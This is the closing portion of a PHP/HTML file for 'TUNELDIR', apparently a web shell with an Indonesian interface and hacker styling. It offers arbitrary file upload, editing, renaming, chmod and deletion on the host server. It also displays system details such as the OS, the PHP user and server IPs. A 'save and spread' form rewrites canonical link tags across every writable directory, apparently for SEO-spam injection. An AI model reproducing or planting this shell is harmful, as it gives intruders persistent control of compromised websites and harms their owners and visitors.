                    <input type="checkbox" name="canon_dirs[]" value="<?php echo htmlspecialchars($adRel); ?>"
                      data-writable="<?php echo $adW?'1':'0'; ?>"
                      onchange="canonCount()">
                    <div class="w-dot <?php echo $adW?'w-ok':'w-no'; ?>"></div>
                    <span class="dir-path" title="<?php echo htmlspecialchars($adRel); ?>"><?php echo htmlspecialchars($adRel); ?></span>
                    <span class="dir-perm"><?php echo td_perm($ad); ?></span>
                  </label>
                  <?php endforeach; ?>
                  <?php if (empty($allDirs)): ?>
                  <div style="padding:20px;text-align:center;color:var(--text3);font-family:var(--mono);font-size:11px">Tidak ada sub-direktori.</div>
                  <?php endif; ?>
                </div>
              </div>
            </div>

            <div style="margin-top:14px;display:flex;gap:9px;align-items:center;flex-wrap:wrap">
              <button class="btn btn-green" type="submit" style="font-size:13px;padding:10px 22px">
                &#x1F4DD; SIMPAN &amp; SEBARKAN
              </button>
              <span style="font-size:11px;color:var(--text3);font-family:var(--mono)">canonical akan diganti per-direktori secara otomatis</span>
            </div>
          </form>

          <!-- Preview box -->
          <div id="canonPreviewBox" style="display:none;margin-top:14px;background:#020405;border:1px solid rgba(0,255,65,0.2);border-radius:var(--r2);padding:14px">
            <div style="font-size:10px;color:var(--green2);font-family:var(--mono);margin-bottom:8px;text-transform:uppercase;letter-spacing:1px">&#x1F50D; Baris Canonical Ditemukan:</div>
            <pre id="canonPreviewContent" style="font-family:var(--mono);font-size:12px;color:var(--green);white-space:pre-wrap;word-break:break-all;margin:0"></pre>
          </div>
        </div>
      </div>

      <!-- UPLOAD BIASA -->
      <div class="card" id="sec-upload">        <div class="card-hdr">
          <div class="card-title">&#x2B06; Upload ke <span style="color:var(--cyan);font-family:var(--mono)"><?php echo htmlspecialchars($relDir); ?></span></div>
          <span class="badge b-cyan">Multi-upload</span>
        </div>
        <div class="card-body">
          <form method="POST" enctype="multipart/form-data" action="<?php echo htmlspecialchars($baseUrl); ?>?dir=<?php echo urlencode($relDir); ?>">
            <input type="hidden" name="action" value="upload">
            <div class="upload-zone" id="dropZone">
              <input type="file" name="files[]" id="fileInput" multiple>
              <span class="up-icon">&#x1F5C2;</span>
              <div class="up-text">Drag &amp; Drop atau klik untuk pilih file</div>
              <div class="up-sub">Multi-file sekaligus ke direktori ini</div>
              <div class="fp-list" id="fpList"></div>
            </div>
            <div style="margin-top:10px;display:flex;gap:7px">
              <button class="btn btn-red" type="submit">&#x26A1; Upload Sekarang</button>
              <button class="btn btn-ghost" type="reset" onclick="document.getElementById('fpList').innerHTML=''">&#x2715; Reset</button>
            </div>
          </form>
        </div>
      </div>

      <!-- TOOLS -->
      <div class="card" id="sec-tools">
        <div class="card-hdr"><div class="card-title">&#x1F6E0; Tools</div></div>
        <div class="card-body">
          <div style="display:flex;flex-wrap:wrap;gap:16px">
            <form method="POST" action="<?php echo htmlspecialchars($baseUrl); ?>?dir=<?php echo urlencode($relDir); ?>" style="flex:1;min-width:200px">
              <input type="hidden" name="action" value="mkdir">
              <label class="form-label">&#x1F4C1; Buat Folder Baru</label>
              <div class="inline-form">
                <input class="form-input" type="text" name="mkdir_name" placeholder="nama-folder" required style="flex:1;min-width:130px">
                <button class="btn btn-green" type="submit">Buat</button>
              </div>
            </form>
            <div style="flex:1;min-width:200px">
              <label class="form-label">&#x1F512; CHMOD</label>
              <div style="color:var(--text3);font-size:11px;margin-top:4px;font-family:var(--mono)">Gunakan tombol CHMOD di tabel file manager di bawah.</div>
            </div>
          </div>
        </div>
      </div>

      <!-- FILE MANAGER TABLE -->
      <div class="card">
        <div class="card-hdr">
          <div class="card-title">&#x1F4C2; File Manager</div>
          <div style="display:flex;gap:7px;align-items:center">
            <input class="form-input" type="text" id="searchInput" placeholder="&#x1F50D; filter..." style="padding:5px 10px;font-size:11px;width:150px">
            <span class="badge b-red"><?php echo count($entries); ?></span>
          </div>
        </div>
        <div class="ftw">
          <table class="ftable" id="fileTable">
            <thead>
              <tr>
                <th>Nama</th><th>Ukuran</th><th>Permission</th><th>Modified</th><th>Aksi</th>
              </tr>
            </thead>
            <tbody>
              <?php foreach ($entries as $e): ?>
              <tr>
                <td>
                  <div class="name-cell">
                    <?php if ($e['is_dir']): ?>
                      <span>&#x1F4C1;</span>
                      <a class="dir-lnk" href="<?php echo $baseUrl; ?>?dir=<?php echo urlencode(rtrim($relDir,'/').'/'.$e['name']); ?>">
                        <?php echo htmlspecialchars($e['name']); ?>
                      </a>
                    <?php else: ?>
                      <span><?php echo td_icon($e['name']); ?></span>
                      <span><?php echo htmlspecialchars($e['name']); ?></span>
                    <?php endif; ?>
                    <?php if (!$e['writable']): ?><span class="badge b-red">RO</span><?php endif; ?>
                  </div>
                </td>
                <td style="font-family:var(--mono);font-size:11px;color:var(--text3)">
                  <?php echo $e['is_dir']?'<span style="color:var(--text3)">DIR</span>':td_sz($e['size']); ?>
                </td>
                <td>
                  <span class="perm-b"><?php echo $e['perm']; ?></span>
                  <span class="sym-b"><?php echo $e['sym']; ?></span>
                </td>
                <td style="color:var(--text3);font-size:11px;white-space:nowrap;font-family:var(--mono)">
                  <?php echo $e['mtime']?date('d M Y H:i',$e['mtime']):'-'; ?>
                </td>
                <td>
                  <div class="acts">
                    <?php if (!$e['is_dir']&&$e['name']!=='..'): ?>
                      <a href="<?php echo $baseUrl; ?>?dir=<?php echo urlencode($relDir); ?>&edit=<?php echo urlencode($e['name']); ?>" class="btn btn-sm btn-purple" title="Edit">&#x270F;</a>
                    <?php endif; ?>
                    <?php if ($e['name']!=='..'): ?>
                      <button class="btn btn-sm btn-warn" onclick="openRename('<?php echo htmlspecialchars(addslashes($e['name'])); ?>')" title="Rename">&#x1F524;</button>
                      <button class="btn btn-sm" style="background:rgba(0,0,0,0.3);color:var(--text2);border:1px solid var(--border2)" onclick="openChmod('<?php echo htmlspecialchars(addslashes($e['name'])); ?>','<?php echo $e['perm']; ?>')" title="Chmod">&#x1F512;</button>
                      <a href="<?php echo $baseUrl; ?>?dir=<?php echo urlencode($relDir); ?>&action=delete&file=<?php echo urlencode($e['name']); ?>" class="btn btn-sm btn-danger" onclick="return confirm('Hapus <?php echo htmlspecialchars(addslashes($e['name'])); ?>?')">&#x1F5D1;</a>
                    <?php endif; ?>
                  </div>
                </td>
              </tr>
              <?php endforeach; ?>
              <?php if (empty($entries)): ?>
              <tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text3);font-family:var(--mono)">&#x1F4EB; Folder kosong</td></tr>
              <?php endif; ?>
            </tbody>
          </table>
        </div>
      </div>

      <!-- SYSINFO -->
      <div class="card" id="sec-sysinfo">
        <div class="card-hdr"><div class="card-title">&#x2699; System Information</div></div>
        <div class="card-body">
          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:6px">
            <?php
            $inf=array(
              array('OS',@php_uname()),array('Doc Root',td_root()),
              array('CWD',@getcwd()),array('PHP User',$sysUser),
              array('PHP',phpversion()),array('SAPI',@php_sapi_name()),
              array('Max Upload',@ini_get('upload_max_filesize')),
              array('Max Exec',@ini_get('max_execution_time').'s'),
              array('Server',isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'?'),
              array('Server IP',isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'?'),
              array('Client IP',isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'?'),
              array('Disk Total',$totalSpace!==false?td_sz((int)$totalSpace):'N/A'),
            );
            foreach ($inf as $row):
            ?>
            <div style="display:flex;gap:7px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--r2);padding:8px 12px;align-items:flex-start">
              <div style="font-size:10px;color:var(--text3);min-width:90px;flex-shrink:0;font-family:var(--mono);text-transform:uppercase;letter-spacing:.5px"><?php echo $row[0]; ?></div>
              <div style="font-family:var(--mono);font-size:10px;color:var(--text2);word-break:break-all"><?php echo htmlspecialchars($row[1]); ?></div>
            </div>
            <?php endforeach; ?>
          </div>
        </div>
      </div>

      <!-- CONTACT -->
      <div class="contact-band">
        <div class="contact-info">
          <span>&#x1F480;</span>
          <div>
            <div style="font-weight:700;color:var(--red)">TUNELDIR <?php echo $TD_VER; ?></div>
            <div>contact: <a href="mailto:<?php echo $TD_EMAIL; ?>"><?php echo $TD_EMAIL; ?></a></div>
          </div>
        </div>
        <div style="font-family:var(--mono);font-size:10px;color:var(--text3)">PHP <?php echo phpversion(); ?> // <?php echo date('Y'); ?></div>
      </div>

    </div><!-- /content -->
  </main>
</div><!-- /layout -->

<!-- MODALS -->
<div class="modal-overlay" id="renameModal">
  <div class="modal">
    <div class="modal-title">&#x270F; Rename File / Folder</div>
    <form method="POST" action="<?php echo htmlspecialchars($baseUrl); ?>?dir=<?php echo urlencode($relDir); ?>">
      <input type="hidden" name="action" value="rename">
      <input type="hidden" name="old_name" id="renameOld">
      <div class="form-group" style="margin-bottom:14px">
        <label class="form-label">Nama Baru</label>
        <input class="form-input" type="text" name="new_name" id="renameNew" required>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-ghost" onclick="closeModal('renameModal')">Batal</button>
        <button type="submit" class="btn btn-red">Rename</button>
      </div>
    </form>
  </div>
</div>

<div class="modal-overlay" id="chmodModal">
  <div class="modal">
    <div class="modal-title">&#x1F512; Ubah Permission (CHMOD)</div>
    <form method="POST" action="<?php echo htmlspecialchars($baseUrl); ?>?dir=<?php echo urlencode($relDir); ?>">
      <input type="hidden" name="action" value="chmod">
      <input type="hidden" name="chmod_file" id="chmodFile">
      <div class="form-group" style="margin-bottom:12px">
        <label class="form-label">File / Folder</label>
        <input class="form-input" type="text" id="chmodName" disabled>
      </div>
      <div class="form-group" style="margin-bottom:12px">
        <label class="form-label">Permission Octal</label>
        <input class="form-input" type="text" name="chmod_val" id="chmodVal" pattern="[0-7]{3,4}" placeholder="755" required>
      </div>
      <div style="display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px">
        <?php foreach (array('777','755','644','600','444','400') as $pm): ?>
          <button type="button" class="btn btn-ghost btn-sm" onclick="document.getElementById('chmodVal').value='<?php echo $pm; ?>'"><?php echo $pm; ?></button>
        <?php endforeach; ?>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-ghost" onclick="closeModal('chmodModal')">Batal</button>
        <button type="submit" class="btn btn-warn">Terapkan</button>
      </div>
    </form>
  </div>
</div>
<?php endif; ?>

<script>
(function(){
  // ── TUNEL dir selector ──────────────────────────
  window.canonCount = function() {
    var cb = document.querySelectorAll('#canonDirWrap input[type=checkbox]:checked');
    var el = document.getElementById('canonDirCount');
    if (el) el.textContent = cb.length + ' dipilih';
    var all = document.querySelectorAll('#canonDirWrap .dir-item');
    for (var i=0;i<all.length;i++) {
      var inp = all[i].querySelector('input');
      if (inp&&inp.checked) all[i].classList.add('selected');
      else all[i].classList.remove('selected');
    }
  };
  window.canonSelectAll = function(v) {
    var cb = document.querySelectorAll('#canonDirWrap input[type=checkbox]');
    for (var i=0;i<cb.length;i++) cb[i].checked=v;
    canonCount();
  };
  window.canonSelectWritable = function() {
    var cb = document.querySelectorAll('#canonDirWrap input[type=checkbox]');
    for (var i=0;i<cb.length;i++) cb[i].checked=(cb[i].getAttribute('data-writable')==='1');
    canonCount();
  };
  window.canonPreview = function() {
    var code = document.getElementById('canonCode').value;
    var box  = document.getElementById('canonPreviewBox');
    var pre  = document.getElementById('canonPreviewContent');
    var det  = document.getElementById('canonDetect');
    if (!code.trim()) { if (box) box.style.display='none'; return; }
    var pat  = /<link\s[^>]*rel=["']canonical["'][^>]*href=["']#["'][^>]*>/gi;
    var pat2 = /<link\s[^>]*href=["']#["'][^>]*rel=["']canonical["'][^>]*>/gi;
    var found= code.match(pat)||[];
    var found2= code.match(pat2)||[];
    var all  = found.concat(found2);
    if (all.length > 0) {
      if (box) box.style.display='block';
      if (pre) pre.textContent = all.join('\n');
      if (det) { det.style.color='var(--green2)'; det.textContent='✔ Canonical ditemukan ('+all.length+' tag)'; }
    } else {
      if (box) box.style.display='none';
      if (det) { det.style.color='var(--text3)'; det.textContent='⚠ href="#" canonical tidak ditemukan'; }
    }
  };
  var cc = document.getElementById('canonCode');
  if (cc) cc.addEventListener('input', canonPreview);

  window.tunelCopyAll = function() {
    var ta = document.getElementById('tunelUrlRaw');
    if (!ta) return;
    ta.style.position='fixed';ta.style.left='0';ta.style.top='0';
    ta.removeAttribute('readonly');
    ta.select();
    try { document.execCommand('copy'); } catch(e){}
    ta.setAttribute('readonly','');
    ta.style.position='absolute';ta.style.left='-9999px';
    var btn = document.querySelector('.tunel-copy-btn');
    if (btn){var orig=btn.innerHTML;btn.innerHTML='&#x2714; Tersalin!';setTimeout(function(){btn.innerHTML=orig;},2000);}
  };

  window.tunelCount = function() {
    var cb = document.querySelectorAll('#dirSelectWrap input[type=checkbox]:checked');
    var el = document.getElementById('tunelCount');
    if (el) el.textContent = cb.length + ' dipilih';
    // highlight selected
    var all = document.querySelectorAll('.dir-item');
    for (var i=0;i<all.length;i++) {
      var inp = all[i].querySelector('input');
      if (inp && inp.checked) all[i].classList.add('selected');
      else all[i].classList.remove('selected');
    }
  };
  window.tunelSelectAll = function(v) {
    var cb = document.querySelectorAll('#dirSelectWrap input[type=checkbox]');
    for (var i=0;i<cb.length;i++) cb[i].checked=v;
    tunelCount();
  };
  window.tunelSelectWritable = function() {
    var cb = document.querySelectorAll('#dirSelectWrap input[type=checkbox]');
    for (var i=0;i<cb.length;i++) cb[i].checked = (cb[i].getAttribute('data-writable')==='1');
    tunelCount();
  };

  // ── TUNEL upload preview ────────────────────────
  var tz = document.getElementById('tunelZone');
  var ti = document.getElementById('tunelInput');
  var tp = document.getElementById('tunelPreview');
  if (tz&&ti) {
    tz.addEventListener('dragover',function(e){e.preventDefault();tz.classList.add('over')});
    tz.addEventListener('dragleave',function(){tz.classList.remove('over')});
    tz.addEventListener('drop',function(e){e.preventDefault();tz.classList.remove('over');ti.files=e.dataTransfer.files;showPrev(e.dataTransfer.files,tp)});
    ti.addEventListener('change',function(){showPrev(ti.files,tp)});
  }

  // ── Normal upload preview ───────────────────────
  var dz = document.getElementById('dropZone');
  var fi = document.getElementById('fileInput');
  var fp = document.getElementById('fpList');
  if (dz&&fi) {
    dz.addEventListener('dragover',function(e){e.preventDefault();dz.classList.add('over')});
    dz.addEventListener('dragleave',function(){dz.classList.remove('over')});
    dz.addEventListener('drop',function(e){e.preventDefault();dz.classList.remove('over');fi.files=e.dataTransfer.files;showPrev(e.dataTransfer.files,fp)});
    fi.addEventListener('change',function(){showPrev(fi.files,fp)});
  }

  function showPrev(files,container) {
    if (!container) return;
    container.innerHTML='';
    var icons={php:'&#x1F418;',html:'&#x1F310;',js:'&#x26A1;',css:'&#x1F3A8;',
      jpg:'&#x1F5BC;',jpeg:'&#x1F5BC;',png:'&#x1F5BC;',zip:'&#x1F4E6;',
      rar:'&#x1F4E6;',txt:'&#x1F4C4;',sql:'&#x1F5C4;',pdf:'&#x1F4D5;',
      mp4:'&#x1F3AC;',mp3:'&#x1F3B5;',sh:'&#x1F4BB;'};
    for (var i=0;i<files.length;i++) {
      var f=files[i];
      var ext=f.name.split('.').pop().toLowerCase();
      var icon=icons[ext]||'&#x1F4C3;';
      var sz=f.size>=1048576?(f.size/1048576).toFixed(1)+' MB':f.size>=1024?Math.round(f.size/1024)+' KB':f.size+' B';
      var d=document.createElement('div');
      d.className='fp-item';
      d.innerHTML='<span>'+icon+'</span><span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+f.name+'</span><span style="color:var(--text3)">'+sz+'</span>';
      container.appendChild(d);
    }
  }

  // ── Search filter ───────────────────────────────
  var si = document.getElementById('searchInput');
  if (si) {
    si.addEventListener('input',function(){
      var v=this.value.toLowerCase();
      var rows=document.querySelectorAll('#fileTable tbody tr');
      for (var i=0;i<rows.length;i++){
        var nc=rows[i].querySelector('.name-cell');
        var t=nc?nc.textContent.toLowerCase():'';
        rows[i].style.display=t.indexOf(v)>=0?'':'none';
      }
    });
  }

  // ── Modals ──────────────────────────────────────
  window.openRename=function(name){
    document.getElementById('renameOld').value=name;
    document.getElementById('renameNew').value=name;
    document.getElementById('renameModal').classList.add('show');
    setTimeout(function(){document.getElementById('renameNew').focus();},100);
  };
  window.openChmod=function(name,perm){
    document.getElementById('chmodFile').value=name;
    document.getElementById('chmodName').value=name;
    document.getElementById('chmodVal').value=perm;
    document.getElementById('chmodModal').classList.add('show');
  };
  window.closeModal=function(id){document.getElementById(id).classList.remove('show');};
  var ovs=document.querySelectorAll('.modal-overlay');
  for (var i=0;i<ovs.length;i++){
    ovs[i].addEventListener('click',function(e){if(e.target===this)this.classList.remove('show');});
  }
  document.addEventListener('keydown',function(e){
    if(e.key==='Escape'){var ms=document.querySelectorAll('.modal-overlay.show');for(var i=0;i<ms.length;i++)ms[i].classList.remove('show');}
  });
})();
</script>
</body>
</html>
